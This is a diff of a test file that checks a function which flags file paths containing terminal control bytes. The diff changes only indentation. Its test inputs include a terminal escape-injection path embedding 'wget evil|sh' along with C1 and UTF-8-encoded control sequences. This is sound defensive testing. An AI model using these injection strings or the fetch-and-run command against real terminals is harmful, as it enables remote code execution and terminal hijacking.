@@ -198,7 +198,7 @@ fn main() {
     # window-title-set + DECRQSS query that would hijack the
     # terminal if echoed raw.
     assert_eq(kii_path_has_control_bytes("/tmp/\x1b]2;wget evil|sh\x07.png"), 1,
-    "CVE-2021-25743 OSC-injection attack path → unsafe");
+      "CVE-2021-25743 OSC-injection attack path → unsafe");
     # BEL (0x07) is the OSC string terminator — another injection
     # primitive.
     assert_eq(kii_path_has_control_bytes("foo\x07.png"),        1, "BEL → unsafe");
@@ -238,7 +238,7 @@ fn main() {
     # The full OSC window-title injection that reached stderr byte-for-byte
     # before this fix — the C1 spelling of the CVE-2021-25743 analog above.
     assert_eq(kii_path_has_control_bytes("\x9D0;PWNED\x9C.png"), 1,
-    "C1 OSC window-title injection → unsafe");
+      "C1 OSC window-title injection → unsafe");
     # UTF-8-ENCODED C1: C2 80..C2 9F decodes to U+0080..U+009F, which a UTF-8
     # terminal may honour. Catching only the raw form would leave this open.
     assert_eq(kii_path_has_control_bytes("a\xC2\x9Bb"),          1, "C2 9B (UTF-8-encoded CSI) → unsafe");
